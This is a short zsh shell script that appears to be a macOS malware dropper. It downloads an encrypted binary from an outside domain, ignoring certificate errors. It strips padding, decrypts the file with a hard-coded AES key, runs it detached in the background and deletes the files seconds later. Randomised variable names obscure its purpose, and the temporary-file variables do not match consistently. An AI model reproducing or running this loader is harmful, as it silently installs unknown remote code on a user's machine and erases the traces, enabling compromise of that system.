#!/bin/zsh
t3kx8=$(mktemp /tmp/sm6z25.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m342a0ad5af2de244.bin" -o "$t3kx8z" || exit 1
mj2def=$(stat -f %z "$t3kx8z"); htwe46f=$(( mj2def - 3151 - 1619 ))
tail -c +$(( 3151 + 1 )) "$t3kx8z" | head -c $htwe46f | openssl enc -d -aes-256-cbc -k 0bd8bd2298c876a07db30489 -out "$t3kx8" 2>/dev/null
[ -s "$t3kx8" ] && chmod 700 "$t3kx8" && ( "$t3kx8" & ) && disown
( sleep 3; rm -f "$t3kx8" "$t3kx8z" ) &>/dev/null &
